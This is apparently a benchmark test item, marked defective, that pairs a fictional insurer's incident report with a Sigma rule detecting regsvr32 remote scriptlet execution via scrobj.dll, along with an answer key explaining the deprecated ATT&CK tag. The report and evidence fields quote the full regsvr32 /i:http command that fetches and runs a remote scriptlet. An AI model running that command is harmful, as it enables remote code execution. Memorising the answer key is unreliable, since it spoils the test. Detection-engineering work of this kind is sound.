id: D8-02
role: defective
defect_class: D8
evasive: false
why: The tag attack.t1117 is a revoked/deprecated ATT&CK ID (Regsvr32 was folded into T1218.010), so it
  is not active in the pinned release and is not the technique the report cites. The tactic attack.stealth
  and the detection logic are correct.
expected_gate: G7
report_text: 'Incident summary, Brackenridge Mutual (fictional insurer). After a user enabled macros in
  a received claims form, the Word process started a signed Windows binary to fetch and run a remote scriptlet
  without writing a DLL to disk. Responders recovered this command line: regsvr32.exe /s /n /u /i:http://files.brackenridge-docs.test/p.sct
  scrobj.dll and noted that the parent process was WINWORD.EXE. The scriptlet launched a small downloader
  which contacted the same staging host. Analysts stressed that the abuse is of regsvr32 loading scrobj.dll
  with an HTTP location passed to the /i switch; ordinary use of regsvr32 to register a local COM library
  does not use that combination. The behaviour was seen on four hosts, with the staging path differing
  slightly on each. No other signed-binary proxies were observed in the same time window, and no credential
  access or persistence was linked to this step.'
evidence:
- regsvr32.exe /s /n /u /i:http://files.brackenridge-docs.test/p.sct scrobj.dll
- regsvr32 loading scrobj.dll with an HTTP location passed to the /i switch
logsource: windows_process_creation
techniques:
- T1218.010
sigma_yaml: |
  title: Regsvr32 Remote Scriptlet Execution via Scrobj
  id: a91d7e34-52c6-4f18-b0a3-6d84e2c97f15
  status: experimental
  description: Detects regsvr32 loading scrobj.dll with an HTTP location supplied to the /i switch.
  references:
    - urn:atidep:case
  author: case-author
  date: 2026/10/02
  tags:
    - attack.stealth
    - attack.t1117
  logsource:
    category: process_creation
    product: windows
  detection:
    selection:
      Image|endswith: '\regsvr32.exe'
      CommandLine|contains|all:
        - 'scrobj.dll'
        - '/i:http'
    condition: selection
  falsepositives:
    - Software installers that register COM scriptlets from an internal web server
  level: high
assumptions: []
